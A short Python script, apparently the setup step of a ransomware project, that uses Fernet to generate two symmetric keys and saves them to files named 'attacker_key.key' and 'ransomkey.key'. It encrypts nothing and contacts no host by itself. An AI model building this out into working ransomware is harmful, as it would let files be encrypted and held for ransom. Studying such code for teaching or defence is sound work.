from cryptography.fernet import Fernet

#generate random synmmetric key for attacker
key = Fernet.generate_key()

with open('attacker_key.key', 'wb') as w :
	w.write(key)
	w.close()

print("Attacker key generated")
#generate random synmmetric to use for encryption
key2 = Fernet.generate_key()

with open('ransomkey.key', 'wb') as w :
	w.write(key2)
	w.close()
print("Ransom key generated")
